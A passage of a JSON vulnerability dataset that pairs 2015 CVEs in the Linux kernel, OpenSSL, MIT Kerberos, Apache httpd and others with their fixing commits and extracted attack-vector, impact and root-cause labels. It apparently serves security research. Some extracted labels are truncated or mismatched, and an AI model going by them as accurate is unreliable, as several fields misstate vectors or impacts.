distinguish between read lengths and write lengths, which might allow guest OS users to execute arbitrary code on the host OS by triggering use of an invalid index.","commit_message_1":"pit : control word is write-only pit control word ( address 0x43 ) is write-only , read are undefined","Vulnerability Type":"buffer overflow","Attack Vector":"by triggering use of an invalid index","Impact":"execute arbitrary code on the host os","Root Cause":"does not distinguish between read lengths and write lengths","Attack Type":"local attacker"},{"commit_id":"2d45a02d0166caf2627fe91897c6ffc3b19514c4","cve_id":"CVE-2015-3212","cwe_id":"CWE-362","commit_message":"sctp: fix ASCONF list handling\n\n->auto_asconf_splist is per namespace and mangled by functions like\nsctp_setsockopt_auto_asconf() which doesn't guarantee any serialization.\n\nAlso, the call to inet_sk_copy_descendant() was backuping\n->auto_asconf_list through the copy but was not honoring\n->do_auto_asconf, which could lead to list corruption if it was\ndifferent between both sockets.\n\nThis commit thus fixes the list handling by using ->addr_wq_lock\nspinlock to protect the list. A special handling is done upon socket\ncreation and destruction for that. Error handlig on sctp_init_sock()\nwill never return an error after having initialized asconf, so\nsctp_destroy_sock() can be called without addrq_wq_lock. The lock now\nwill be take on sctp_close_sock(), before locking the socket, so we\ndon't do it in inverse order compared to sctp_addr_wq_timeout_handler().\n\nInstead of taking the lock on sctp_sock_migrate() for copying and\nrestoring the list values, it's preferred to avoid rewritting it by\nimplementing sctp_copy_descendant().\n\nIssue was found with a test application that kept flipping sysctl\ndefault_auto_asconf on and off, but one could trigger it by issuing\nsimultaneous setsockopt() calls on multiple sockets or by\ncreating\/destroying sockets fast enough. This is only triggerable\nlocally.\n\nFixes: 9f7d653b67ae (\"sctp: Add Auto-ASCONF support (core).\")\nReported-by: Ji Jianwen <jiji@redhat.com>\nSuggested-by: Neil Horman <nhorman@tuxdriver.com>\nSuggested-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in net\/sctp\/socket.c in the Linux kernel before 4.1.2 allows local users to cause a denial of service (list corruption and panic) via a rapid series of system calls related to sockets, as demonstrated by setsockopt calls.","commit_message_1":"fix asconf list handling - > auto_asconf_splist is per namespace and mangled by function like sctp_setsockopt_auto_asconf ( ) which doe n't guarantee any serialization","Vulnerability Type":"Race Condition","Attack Vector":"via a rapid series of system calls related to sockets , as demonstrated by setsockopt calls","Impact":"cause a denial of service ( list corruption and panic )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"cd2b7a26c776b0754fb98426a67804fd48118708","cve_id":"CVE-2015-3185","cwe_id":"CWE-264","commit_message":"SECURITY: CVE-2015-3183 (cve.mitre.org)\n\nReplacement of ap_some_auth_required (unusable in Apache httpd 2.4)\nwith new ap_some_authn_required and ap_force_authn hook.\n\nSubmitted by: breser\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/trunk@1684524 13f79535-47bb-0310-9956-ffa450edef68","summary":"The ap_some_auth_required function in server\/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.","commit_message_1":"<cve_id> ( <file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging the presence of a module that relies on the 2 . 2 api behavior","Impact":"bypass intended access restrictions in opportunistic circumstances","Root Cause":"does not consider that a require directive may be associated with an authorization setting rather than an authentication setting","Attack Type":"remote attacker"},{"commit_id":"e427c41257957b57036d5a549b260b6185d1dd73","cve_id":"CVE-2015-3183","cwe_id":"CWE-20","commit_message":"Limit accepted chunk-size to 2^63-1 and be strict about chunk-ext\nauthorized characters.\n\nSubmitted by: Yann Ylavic\n\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/trunk@1684513 13f79535-47bb-0310-9956-ffa450edef68","summary":"The chunked transfer coding implementation in the Apache HTTP Server before 2.4.14 does not properly parse chunk headers, which allows remote attackers to conduct HTTP request smuggling attacks via a crafted request, related to mishandling of large chunk-size values and invalid chunk-extension characters in modules\/http\/http_filters.c.","commit_message_1":"limit accepted chunk-size to <number>^<number>-<number> and be strict about chunk-ext authorized character","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted request , related to mishandling of large chunk - size values and invalid chunk - extension characters in modules \/ http \/ http _ filters . c","Impact":"conduct http request smuggling attacks","Root Cause":"does not properly parse chunk headers","Attack Type":"remote attacker"},{"commit_id":"397d425dc26da728396e66d392d5dcb8dac30c37","cve_id":"CVE-2015-2925","cwe_id":"CWE-254","commit_message":"vfs: Test for and handle paths that are unreachable from their mnt_root\n\nIn rare cases a directory can be renamed out from under a bind mount.\nIn those cases without special handling it becomes possible to walk up\nthe directory tree to the root dentry of the filesystem and down\nfrom the root dentry to every other file or directory on the filesystem.\n\nLike division by zero .. from an unconnected path can not be given\na useful semantic as there is no predicting at which path component\nthe code will realize it is unconnected.  We certainly can not match\nthe current behavior as the current behavior is a security hole.\n\nTherefore when encounting .. when following an unconnected path\nreturn -ENOENT.\n\n- Add a function path_connected to verify path->dentry is reachable\n  from path->mnt.mnt_root.  AKA to validate that rename did not do\n  something nasty to the bind mount.\n\n  To avoid races path_connected must be called after following a path\n  component to it's next path component.\n\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The prepend_path function in fs\/dcache.c in the Linux kernel before 4.2.4 does not properly handle rename actions inside a bind mount, which allows local users to bypass an intended container protection mechanism by renaming a directory, related to a *double-chroot attack.*","commit_message_1":"test for and handle path that are unreachable from their mnt_root in rare case a directory can be renamed out from under a bind mount","Vulnerability Type":"Security Features","Attack Vector":"By creating another user and mounting namespace within a container","Impact":"bypass an intended container protection mechanism","Root Cause":"does not properly handle rename actions inside a bind mount","Attack Type":"local attacker"},{"commit_id":"6fd99094de2b83d1d4c8457f2c83483b2828e75a","cve_id":"CVE-2015-2922","cwe_id":"CWE-17","commit_message":"ipv6: Don't reduce hop limit for an interface\n\nA local route may have a lower hop_limit set than global routes do.\n\nRFC 3756, Section 4.2.7, \"Parameter Spoofing\"\n\n>   1.  The attacker includes a Current Hop Limit of one or another small\n>       number which the attacker knows will cause legitimate packets to\n>       be dropped before they reach their destination.\n\n>   As an example, one possible approach to mitigate this threat is to\n>   ignore very small hop limits.  The nodes could implement a\n>   configurable minimum hop limit, and ignore attempts to set it below\n>   said limit.\n\nSigned-off-by: D.S. Ljungmark <ljungmark@modio.se>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ndisc_router_discovery function in net\/ipv6\/ndisc.c in the Neighbor Discovery (ND) protocol implementation in the IPv6 stack in the Linux kernel before 3.19.6 allows remote attackers to reconfigure a hop-limit setting via a small hop_limit value in a Router Advertisement (RA) message.","commit_message_1":"do n't reduce hop limit for an interface a local route may have a lower hop_limit set than global route do","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via a small hop _ limit value in a router advertisement ( ra ) message","Impact":"reconfigure a hop - limit setting","Root Cause":"caused by the improper handling of Router Advertisements","Attack Type":"remote attacker"},{"commit_id":"bd20bb02e75e2c0483832b52f2577253febfb690","cve_id":"CVE-2015-2831","cwe_id":"CWE-119","commit_message":"Fix memory overflow if the name of an environment is larger than 500 characters. Bug found by Adam Sampson.","summary":"Buffer overflow in das_watchdog 0.9.0 allows local users to execute arbitrary code with root privileges via a large string in the XAUTHORITY environment variable.","commit_message_1":"fix memory overflow if the name of an environment is larger than <number> character","Vulnerability Type":"buffer overflow","Attack Vector":"via a large string in the xauthority environment variable","Impact":"execute arbitrary code with root privileges","Root Cause":"caused by improper bounds checking when handling the XAUTHORITY environment variable","Attack Type":"local attacker"},{"commit_id":"b5e38970ffd55e2dd9f706ce75af9a8d7730b1b8","cve_id":"CVE-2015-2779","cwe_id":"CWE-399","commit_message":"Improve the message-splitting algorithm for PRIVMSG and CTCP\n\nThis introduces a new message splitting algorithm based on\nQTextBoundaryFinder.  It works by first starting with the entire\nmessage to be sent, encoding it, and checking to see if it is over\nthe maximum message length.  If it is, it uses QTBF to find the\nword boundary most immediately preceding the maximum length.  If no\nsuitable boundary can be found, it falls back to searching for\ngrapheme boundaries.  It repeats this process until the entire\nmessage has been sent.\n\nUnlike what it replaces, the new splitting code is not recursive\nand cannot cause stack overflows.  Additionally, if it is unable\nto split a string, it will give up gracefully and not crash the\ncore or cause a thread to run away.\n\nThis patch fixes two bugs.  The first is garbage characters caused\nby accidentally splitting the string in the middle of a multibyte\ncharacter.  Since the new code splits at a character level instead\nof a byte level, this will no longer be an issue.  The second is\nthe core crash caused by sending an overlength CTCP query (\"\/me\")\ncontaining only multibyte characters.  This bug was caused by the\nold CTCP splitter using the byte index from lastParamOverrun() as\na character index for a QString.","summary":"Stack consumption vulnerability in the message splitting functionality in Quassel before 0.12-rc1 allows remote attackers to cause a denial of service (uncontrolled recursion) via a crafted massage.","commit_message_1":"improve the message-splitting algorithm for privmsg and ctcp this introduces a new message splitting algorithm based on qtextboundaryfinder","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted massage","Impact":"cause a denial of service ( uncontrolled recursion )","Root Cause":"caused by a stack consumption vulnerability","Attack Type":"remote attacker"},{"commit_id":"3db8dfec1ef50ddd78d6ba9503185995876a39fd","cve_id":"CVE-2015-2698","cwe_id":"CWE-119","commit_message":"Fix IAKERB context export\/import [CVE-2015-2698]\n\nThe patches for CVE-2015-2696 contained a regression in the newly\nadded IAKERB iakerb_gss_export_sec_context() function, which could\ncause it to corrupt memory.  Fix the regression by properly\ndereferencing the context_handle pointer before casting it.\n\nAlso, the patches did not implement an IAKERB gss_import_sec_context()\nfunction, under the erroneous belief that an exported IAKERB context\nwould be tagged as a krb5 context.  Implement it now to allow IAKERB\ncontexts to be successfully exported and imported after establishment.\n\nCVE-2015-2698:\n\nIn any MIT krb5 release with the patches for CVE-2015-2696 applied, an\napplication which calls gss_export_sec_context() may experience memory\ncorruption if the context was established using the IAKERB mechanism.\nHistorically, some vulnerabilities of this nature can be translated\ninto remote code execution, though the necessary exploits must be\ntailored to the individual application and are usually quite\ncomplicated.\n\n    CVSSv2 Vector: AV:N\/AC:H\/Au:S\/C:C\/I:C\/A:C\/E:POC\/RL:OF\/RC:C\n\nticket: 8273 (new)\ntarget_version: 1.14\ntags: pullup","summary":"The iakerb_gss_export_sec_context function in lib\/gssapi\/krb5\/iakerb.c in MIT Kerberos 5 (aka krb5) 1.14 pre-release 2015-09-14 improperly accesses a certain pointer, which allows remote authenticated users to cause a denial of service (memory corruption) or possibly have unspecified other impact by interacting with an application that calls the gss_export_sec_context function.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2015-2696.","commit_message_1":"fix iakerb context export\/import [ <cve_id> ] the patch for <cve_id> contained a regression in the newly added iakerb iakerb_gss_export_sec_context ( ) function , which could cause it to corrupt memory","Vulnerability Type":"buffer overflow","Attack Vector":"by interacting with an application that calls the gss _ export _ sec _ context function","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by the failure to prevent access to a specific pointer by the iakerb_gss_export_sec_context() function","Attack Type":"remote attacker"},{"commit_id":"f0c094a1b745d91ef2f9a4eae2149aac026a5789","cve_id":"CVE-2015-2697","cwe_id":"CWE-119","commit_message":"Fix build_principal memory bug [CVE-2015-2697]\n\nIn build_principal_va(), use k5memdup0() instead of strdup() to make a\ncopy of the realm, to ensure that we allocate the correct number of\nbytes and do not read past the end of the input string.  This bug\naffects krb5_build_principal(), krb5_build_principal_va(), and\nkrb5_build_principal_alloc_va().  krb5_build_principal_ext() is not\naffected.\n\nCVE-2015-2697:\n\nIn MIT krb5 1.7 and later, an authenticated attacker may be able to\ncause a KDC to crash using a TGS request with a large realm field\nbeginning with a null byte.  If the KDC attempts to find a referral to\nanswer the request, it constructs a principal name for lookup using\nkrb5_build_principal() with the requested realm.  Due to a bug in this\nfunction, the null byte causes only one byte be allocated for the\nrealm field of the constructed principal, far less than its length.\nSubsequent operations on the lookup principal may cause a read beyond\nthe end of the mapped memory region, causing the KDC process to crash.\n\nCVSSv2: AV:N\/AC:L\/Au:S\/C:N\/I:N\/A:C\/E:POC\/RL:OF\/RC:C\n\nticket: 8252 (new)\ntarget_version: 1.14\ntags: pullup","summary":"The build_principal_va function in lib\/krb5\/krb\/bld_princ.c in MIT Kerberos 5 (aka krb5) before 1.14 allows remote authenticated users to cause a denial of service (out-of-bounds read and KDC crash) via an initial '0' character in a long realm field within a TGS request.","commit_message_1":"fix build_principal memory bug [ <cve_id> ] in build_principal_va ( ) , use k5memdup0 ( ) instead of strdup ( ) to make a copy of the realm , to ensure that we allocate the correct number of byte and do not read past the end of the input string","Vulnerability Type":"buffer overflow","Attack Vector":"via an initial ' 0 ' character in a long realm field within a tgs request","Impact":"cause a denial of service ( out - of - bounds read and kdc crash )","Root Cause":"The build_principal_va function","Attack Type":"remote attacker"},{"commit_id":"e04f0283516e80d2f93366e0d479d13c9b5c8c2a","cve_id":"CVE-2015-2696","cwe_id":"CWE-18","commit_message":"Fix IAKERB context aliasing bugs [CVE-2015-2696]\n\nThe IAKERB mechanism currently replaces its context handle with the\nkrb5 mechanism handle upon establishment, under the assumption that\nmost GSS functions are only called after context establishment.  This\nassumption is incorrect, and can lead to aliasing violations for some\nprograms.  Maintain the IAKERB context structure after context\nestablishment and add new IAKERB entry points to refer to it with that\ntype.  Add initiate and established flags to the IAKERB context\nstructure for use in gss_inquire_context() prior to context\nestablishment.\n\nCVE-2015-2696:\n\nIn MIT krb5 1.9 and later, applications which call\ngss_inquire_context() on a partially-established IAKERB context can\ncause the GSS-API library to read from a pointer using the wrong type,\ngenerally causing a process crash.  Java server applications using the\nnative JGSS provider are vulnerable to this bug.  A carefully crafted\nIAKERB packet might allow the gss_inquire_context() call to succeed\nwith attacker-determined results, but applications should not make\naccess control decisions based on gss_inquire_context() results prior\nto context establishment.\n\n    CVSSv2 Vector: AV:N\/AC:M\/Au:N\/C:N\/I:N\/A:C\/E:POC\/RL:OF\/RC:C\n\n[ghudson@mit.edu: several bugfixes, style changes, and edge-case\nbehavior changes; commit message and CVE description]\n\nticket: 8244\ntarget_version: 1.14\ntags: pullup","summary":"lib\/gssapi\/krb5\/iakerb.c in MIT Kerberos 5 (aka krb5) before 1.14 relies on an inappropriate context handle, which allows remote attackers to cause a denial of service (incorrect pointer read and process crash) via a crafted IAKERB packet that is mishandled during a gss_inquire_context call.","commit_message_1":"fix iakerb context aliasing bug [ <cve_id> ] the iakerb mechanism currently replaces it context handle with the krb5 mechanism handle upon establishment , under the assumption that most g function are only called after context establishment","Vulnerability Type":"DEPRECATED: Source Code","Attack Vector":"via a crafted iakerb packet that is mishandled during a gss _ inquire _ context call .","Impact":"cause a denial of service ( incorrect pointer read and process crash )","Root Cause":"inappropriate context handle ,","Attack Type":"remote attacker"},{"commit_id":"b51b33f2bc5d1497ddf5bd107f791c101695000d","cve_id":"CVE-2015-2695","cwe_id":"CWE-18","commit_message":"Fix SPNEGO context aliasing bugs [CVE-2015-2695]\n\nThe SPNEGO mechanism currently replaces its context handle with the\nmechanism context handle upon establishment, under the assumption that\nmost GSS functions are only called after context establishment.  This\nassumption is incorrect, and can lead to aliasing violations for some\nprograms.  Maintain the SPNEGO context structure after context\nestablishment and refer to it in all GSS methods.  Add initiate and\nopened flags to the SPNEGO context structure for use in\ngss_inquire_context() prior to context establishment.\n\nCVE-2015-2695:\n\nIn MIT krb5 1.5 and later, applications which call\ngss_inquire_context() on a partially-established SPNEGO context can\ncause the GSS-API library to read from a pointer using the wrong type,\ngenerally causing a process crash.  This bug may go unnoticed, because\nthe most common SPNEGO authentication scenario establishes the context\nafter just one call to gss_accept_sec_context().  Java server\napplications using the native JGSS provider are vulnerable to this\nbug.  A carefully crafted SPNEGO packet might allow the\ngss_inquire_context() call to succeed with attacker-determined\nresults, but applications should not make access control decisions\nbased on gss_inquire_context() results prior to context establishment.\n\n    CVSSv2 Vector: AV:N\/AC:M\/Au:N\/C:N\/I:N\/A:C\/E:POC\/RL:OF\/RC:C\n\n[ghudson@mit.edu: several bugfixes, style changes, and edge-case\nbehavior changes; commit message and CVE description]\n\nticket: 8244\ntarget_version: 1.14\ntags: pullup","summary":"lib\/gssapi\/spnego\/spnego_mech.c in MIT Kerberos 5 (aka krb5) before 1.14 relies on an inappropriate context handle, which allows remote attackers to cause a denial of service (incorrect pointer read and process crash) via a crafted SPNEGO packet that is mishandled during a gss_inquire_context call.","commit_message_1":"fix spnego context aliasing bug [ <cve_id> ] the spnego mechanism currently replaces it context handle with the mechanism context handle upon establishment , under the assumption that most g function are only called after context establishment","Vulnerability Type":"DEPRECATED: Source Code","Attack Vector":"via a crafted spnego packet that is mishandled during a gss _ inquire _ context call .","Impact":"cause a denial of service ( incorrect pointer read and process crash )","Root Cause":"inappropriate context handle ,","Attack Type":"remote attacker"},{"commit_id":"e3b5a5e5267818c97750b266df50b6a3d4649604","cve_id":"CVE-2015-2694","cwe_id":"CWE-264","commit_message":"Prevent requires_preauth bypass [CVE-2015-2694]\n\nIn the OTP kdcpreauth module, don't set the TKT_FLG_PRE_AUTH bit until\nthe request is successfully verified.  In the PKINIT kdcpreauth\nmodule, don't respond with code 0 on empty input or an unconfigured\nrealm.  Together these bugs could cause the KDC preauth framework to\nerroneously treat a request as pre-authenticated.\n\nCVE-2015-2694:\n\nIn MIT krb5 1.12 and later, when the KDC is configured with PKINIT\nsupport, an unauthenticated remote attacker can bypass the\nrequires_preauth flag on a client principal and obtain a ciphertext\nencrypted in the principal's long-term key.  This ciphertext could be\nused to conduct an off-line dictionary attack against the user's\npassword.\n\n    CVSSv2 Vector: AV:N\/AC:M\/Au:N\/C:P\/I:P\/A:N\/E:POC\/RL:OF\/RC:C\n\nticket: 8160 (new)\ntarget_version: 1.13.2\ntags: pullup\nsubject: requires_preauth bypass in PKINIT-enabled KDC [CVE-2015-2694]","summary":"The kdcpreauth modules in MIT Kerberos 5 (aka krb5) 1.12.x and 1.13.x before 1.13.2 do not properly track whether a client's request has been validated, which allows remote attackers to bypass an intended preauthentication requirement by providing (1) zero bytes of data or (2) an arbitrary realm name, related to plugins\/preauth\/otp\/main.c and plugins\/preauth\/pkinit\/pkinit_srv.c.","commit_message_1":"prevent requires_preauth bypass [ <cve_id> ] in the otp kdcpreauth module , do n't set the tkt_flg_pre_auth bit until the request is successfully verified","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by providing zero bytes of data or an arbitrary realm name , related to plugins \/ preauth \/ otp \/ main . c and plugins","Impact":"bypass an intended preauthentication requirement","Root Cause":"do not properly track whether a client ' s request has been validated","Attack Type":"remote attacker"},{"commit_id":"f84598bd7c851f8b0bf8cd0d7c3be0d73c432ff4","cve_id":"CVE-2015-2666","cwe_id":"CWE-119","commit_message":"x86\/microcode\/intel: Guard against stack overflow in the loader\n\nmc_saved_tmp is a static array allocated on the stack, we need to make\nsure mc_saved_count stays within its bounds, otherwise we're overflowing\nthe stack in _save_mc(). A specially crafted microcode header could lead\nto a kernel crash or potentially kernel execution.\n\nSigned-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>\nCc: \"H. Peter Anvin\" <hpa@zytor.com>\nCc: Fenghua Yu <fenghua.yu@intel.com>\nLink: http:\/\/lkml.kernel.org\/r\/1422964824-22056-1-git-send-email-quentin.casasnovas@oracle.com\nSigned-off-by: Borislav Petkov <bp@suse.de>","summary":"Stack-based buffer overflow in the get_matching_model_microcode function in arch\/x86\/kernel\/cpu\/microcode\/intel_early.c in the Linux kernel before 4.0 allows context-dependent attackers to gain privileges by constructing a crafted microcode header and leveraging root privileges for write access to the initrd.","commit_message_1":"guard against stack overflow in the loader mc_saved_tmp is a static array allocated on the stack , we need to make sure mc_saved_count stay within it bound , otherwise we 're overflowing the stack in _save_mc ( )","Vulnerability Type":"buffer overflow","Attack Vector":"by constructing a crafted microcode header and leveraging root privileges for write access to the initrd","Impact":"gain privileges","Root Cause":"caused by improper bounds checking by the get_matching_model_microcode() function","Attack Type":"local attacker"},{"commit_id":"59357157706d47c365b2227739e17daba3607526","cve_id":"CVE-2015-2304","cwe_id":"CWE-22","commit_message":"Add ARCHIVE_EXTRACT_SECURE_NOABSOLUTEPATHS option\n\nThis fixes a directory traversal in the cpio tool.","summary":"Absolute path traversal vulnerability in bsdcpio in libarchive 3.1.2 and earlier allows remote attackers to write to arbitrary files via a full pathname in an archive.","commit_message_1":"add archive_extract_secure_noabsolutepaths option this fix a directory traversal in the cpio tool","Vulnerability Type":"Path Traversal","Attack Vector":"via a full pathname in an archive","Impact":"write to arbitrary files","Root Cause":"send a specially-crafted URL request containing absolute path","Attack Type":"remote attacker"},{"commit_id":"af6fc858a35b90e89ea7a7ee58e66628c55c776b","cve_id":"CVE-2015-2150","cwe_id":"CWE-264","commit_message":"xen-pciback: limit guest control of command register\n\nOtherwise the guest can abuse that control to cause e.g. PCIe\nUnsupported Request responses by disabling memory and\/or I\/O decoding\nand subsequently causing (CPU side) accesses to the respective address\nranges, which (depending on system configuration) may be fatal to the\nhost.\n\nNote that to alter any of the bits collected together as\nPCI_COMMAND_GUEST permissive mode is now required to be enabled\nglobally or on the specific device.\n\nThis is CVE-2015-2150 \/ XSA-120.\n\nSigned-off-by: Jan Beulich <jbeulich@suse.com>\nReviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: David Vrabel <david.vrabel@citrix.com>","summary":"Xen 3.3.x through 4.5.x and the Linux kernel through 3.19.1 do not properly restrict access to PCI command registers, which might allow local guest OS users to cause a denial of service (non-maskable interrupt and host crash) by disabling the (1) memory or (2) I\/O decoding for a PCI Express device and then accessing the device, which triggers an Unsupported Request (UR) response.","commit_message_1":"limit guest control of command register otherwise the guest can abuse that control to cause <file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by disabling the memory or  i \/ o decoding for a pci express device and then accessing the device , which triggers an unsupported request response","Impact":"cause a denial of service ( non - maskable interrupt and host crash )","Root Cause":"do not properly restrict access to pci command registers","Attack Type":"local attacker"},{"commit_id":"9425e16437439e68c7d96abef922167d68fafaff","cve_id":"CVE-2015-2141","cwe_id":"CWE-200","commit_message":"Fix for CVE-2015-2141. Thanks to Evgeny Sidorov for reporting. Squaring to satisfy Jacobi requirements suggested by JPM.","summary":"The InvertibleRWFunction::CalculateInverse function in rw.cpp in libcrypt++ 5.6.2 does not properly blind private key operations for the Rabin-Williams digital signature algorithm, which allows remote attackers to obtain private keys via a timing attack.","commit_message_1":"fix for <cve_id>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a timing attack","Impact":"obtain private","Root Cause":"does not properly blind private key operations for the rabin - williams digital signature algorithm","Attack Type":"remote attacker"},{"commit_id":"84ac07c","cve_id":"CVE-2015-1867","cwe_id":"CWE-264","commit_message":"Fix: acl: Do not delay evaluation of added nodes in some situations\n\nIt is not appropriate when the node has no children as it is not a\nplaceholder","summary":"Pacemaker before 1.1.13 does not properly evaluate added nodes, which allows remote read-only users to gain privileges via an acl command.","commit_message_1":"acl : do not delay evaluation of added node in some situation it is not appropriate when the node ha no child a it is not a placeholder","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via an acl command","Impact":"gain privileges","Root Cause":"does not properly evaluate added nodes","Attack Type":"remote attacker"},{"commit_id":"f0d1bec9d58d4c038d0ac958c9af82be6eb18045","cve_id":"CVE-2015-1805","cwe_id":"CWE-17","commit_message":"new helper: copy_page_from_iter()\n\nparallel to copy_page_to_iter().  pipe_write() switched to it (and became\n->write_iter()).\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The (1) pipe_read and (2) pipe_write implementations in fs\/pipe.c in the Linux kernel before 3.16 do not properly consider the side effects of failed __copy_to_user_inatomic and __copy_from_user_inatomic calls, which allows local users to cause a denial of service (system crash) or possibly gain privileges via a crafted application, aka an *I\/O vector array overrun.*","commit_message_1":"copy_page_from_iter ( ) parallel to copy_page_to_iter ( )","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via a crafted application , aka an * i \/ o vector array overrun . *","Impact":"cause a denial of service ( system crash ) or possibly gain privileges","Root Cause":"do not properly consider the side effects of failed _ _ copy _ to _ user _ inatomic and _ _ copy _ from _ user _ inatomic calls","Attack Type":"local attacker"},{"commit_id":"cd30f03ac5bf2962f44bd02ae8d88245dff2f12c","cve_id":"CVE-2015-1792","cwe_id":"CWE-399","commit_message":"Canonicalise input in CMS_verify.\n\nIf content is detached and not binary mode translate the input to\nCRLF format. Before this change the input was verified verbatim\nwhich lead to a discrepancy between sign and verify.","summary":"The do_free_upto function in crypto\/cms\/cms_smime.c in OpenSSL before 0.9.8zg, 1.0.0 before 1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of service (infinite loop) via vectors that trigger a NULL value of a BIO data structure, as demonstrated by an unrecognized X.660 OID for a hash function.","commit_message_1":"canonicalise input in cms_verify","Vulnerability Type":"Resource Management Errors","Attack Vector":"via vectors that trigger a value of a bio data structure , as demonstrated by an unrecognized x . 660 oid for a hash function ","Impact":"cause a denial of service ( infinite loop )","Root Cause":"caused by an error when verifying a signedData message","Attack Type":"remote attacker"},{"commit_id":"98ece4eebfb6cd45cc8d550c6ac0022965071afc","cve_id":"CVE-2015-1791","cwe_id":"CWE-362","commit_message":"Fix race condition in NewSessionTicket\n\nIf a NewSessionTicket is received by a multi-threaded client when\nattempting to reuse a previous ticket then a race condition can occur\npotentially leading to a double free of the ticket data.\n\nCVE-2015-1791\n\nThis also fixes RT#3808 where a session ID is changed for a session already\nin the client session cache. Since the session ID is the key to the cache\nthis breaks the cache access.\n\nParts of this patch were inspired by this Akamai change:\nhttps:\/\/github.com\/akamai\/openssl\/commit\/c0bf69a791239ceec64509f9f19fcafb2461b0d3\n\nReviewed-by: Rich Salz <rsalz@openssl.org>","summary":"Race condition in the ssl3_get_new_session_ticket function in ssl\/s3_clnt.c in OpenSSL before 0.9.8zg, 1.0.0 before 1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b, when used for a multi-threaded client, allows remote attackers to cause a denial of service (double free and application crash) or possibly have unspecified other impact by providing a NewSessionTicket during an attempt to reuse a ticket that had been obtained earlier.","commit_message_1":"fix race condition in newsessionticket if a newsessionticket is received by a multi-threaded client when attempting to reuse a previous ticket then a race condition can occur potentially leading to a double free of the ticket data","Vulnerability Type":"Race Condition","Attack Vector":"possibly have unspecified other impact by providing a newsessionticket during an attempt","Impact":"cause a denial of service ( double free and application crash ) or","Root Cause":"used for a multi - threaded client","Attack Type":"remote attacker"},{"commit_id":"59302b600e8d5b77ef144e447bb046fd7ab72686","cve_id":"CVE-2015-1790","cwe_id":null,"commit_message":"PKCS#7: Fix NULL dereference with missing EncryptedContent.\n\nCVE-2015-1790\n\nReviewed-by: Rich Salz <rsalz@openssl.org>","summary":"The PKCS7_dataDecodefunction in crypto\/pkcs7\/pk7_doit.c in OpenSSL before 0.9.8zg, 1.0.0 before 1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a PKCS#7 blob that uses ASN.1 encoding and lacks inner EncryptedContent data.","commit_message_1":"pkcs # <number> : fix null dereference with missing encryptedcontent","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a PKCS#7 blob that uses ASN.1 encoding and lacks inner EncryptedContent data","Impact":"cause a denial of service (NULL pointer dereference and application crash)","Root Cause":"caused by the improper handling of missing inner EncryptedContent by the PKCS#7 parsing code","Attack Type":"remote attacker"},{"commit_id":"f48b83b4fb7d6689584cf25f61ca63a4891f5b11","cve_id":"CVE-2015-1789","cwe_id":"CWE-119","commit_message":"Fix length checks in X509_cmp_time to avoid out-of-bounds reads.\n\nAlso tighten X509_cmp_time to reject more than three fractional\nseconds in the time; and to reject trailing garbage after the offset.\n\nCVE-2015-1789\n\nReviewed-by: Viktor Dukhovni <viktor@openssl.org>\nReviewed-by: Richard Levitte <levitte@openssl.org>","summary":"The X509_cmp_time function in crypto\/x509\/x509_vfy.c in OpenSSL before 0.9.8zg, 1.0.0 before 1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted length field in ASN1_TIME data, as demonstrated by an attack against a server that supports client authentication with a custom verification callback.","commit_message_1":"fix length check in x509_cmp_time to avoid out-of-bounds read","Vulnerability Type":"buffer overflow","Attack Vector":"with a custom verification callback","Impact":"cause a denial of service ( out - of - bounds read and application crash ) via a crafted length","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"4924b37ee01f71ae19c94a8934b80eeb2f677932","cve_id":"CVE-2015-1788","cwe_id":"CWE-399","commit_message":"bn\/bn_gf2m.c: avoid infinite loop wich malformed ECParamters.\n\nCVE-2015-1788\n\nReviewed-by: Matt Caswell <matt@openssl.org>","summary":"The BN_GF2m_mod_inv function in crypto\/bn\/bn_gf2m.c in OpenSSL before 0.9.8s, 1.0.0 before 1.0.0e, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b does not properly handle ECParameters structures in which the curve is over a malformed binary polynomial field, which allows remote attackers to cause a denial of service (infinite loop) via a session that uses an Elliptic Curve algorithm, as demonstrated by an attack against a server that supports client authentication.","commit_message_1":"bn\/<file> : avoid infinite loop wich 